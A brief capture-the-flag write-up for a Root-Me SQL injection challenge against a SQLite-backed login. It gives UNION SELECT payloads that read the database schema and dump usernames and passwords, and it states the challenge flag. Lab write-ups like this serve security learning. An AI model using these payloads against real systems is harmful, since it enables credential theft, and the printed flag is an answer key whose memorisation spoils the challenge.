
###### Challenge Description
https://www.root-me.org/fr/Documentation/Web/Injection-SQL


### Find the attack Vector

I tried a basic SQL injection in the login like this but it did not work :

```

```



All info about SQL injection - String :

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-string


I did this to find the

```
' UNION SELECT 1,sql FROM sqlite_master--
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308095912.png)



Payload to find the admin password :

```
`' UNION SELECT username, password FROM users--`
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308095701.png)

Flag : c4K04dtIaJsuWdi